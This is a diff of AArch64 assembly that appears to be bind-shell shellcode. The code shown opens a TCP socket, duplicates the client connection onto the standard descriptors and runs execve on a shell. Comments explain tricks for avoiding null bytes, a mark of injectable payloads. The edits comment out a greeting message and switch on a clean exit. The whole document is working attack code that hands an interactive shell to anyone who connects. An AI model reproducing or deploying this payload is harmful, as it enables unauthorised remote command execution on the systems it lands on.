@@ -8,7 +8,7 @@
 // rbp - 0x428                       buffer
 
 _start:
-    sub x20, sp, #(8*133)    // Allocate stack space 
+    sub x20, sp, #(8*133)   // Allocate stack space 
 
     mov x0, #2              // AF_INET
     mov x1, #1              // SOCK_STREAM
@@ -38,11 +38,11 @@ _start:
 
     str x0, [x20, #8]       // Store client connection
 
-    ldr x0, [x20, #8]       // Move client for write
-    adr x1, hello           // Message
-    mov x2, #7              // Message length
-    mov x8, #64             // Syscall for write
-    svc #0x1337
+    //ldr x0, [x20, #8]       // Move client for write
+    //adr x1, hello           // Message
+    //mov x2, #7              // Message length
+    //mov x8, #64             // Syscall for write
+    //svc #0x1337
 
     ldr x0, [x20, #8]       // Move client connection for dup
     mov x1, xzr             // Dup stdin
@@ -62,23 +62,15 @@ _start:
     mov x8, #24             // Syscall for dup
     svc #0x1337
 
-    adr x0, sh          // Use adr instead of ldr for fewer null bytes
-    mov x1, xzr         // Move from zero register instead of using literal
+    adr x0, sh              // Use adr instead of ldr for fewer null bytes
+    mov x1, xzr             // Move from zero register instead of using literal
     mov x2, xzr
-    mov x8, #221        // Call execve
+    mov x8, #221            // Call execve
     svc #0x1337
 
-    //ldr x0, [x20, #8]       // Move client connection for close
-    //mov x8, #57             // Syscall for close
-    //svc #0x1337
-
-    //ldr x0, [x20]           // Move socket for close
-    //mov x8, #57             // Syscall for close
-    //svc #0x1337
-
-    //mov x0, xzr
-    //mov w8, #93
-    //svc #0
+    mov x0, xzr
+    mov w8, #93
+    svc #0
 
 .section .data
     sockaddr:
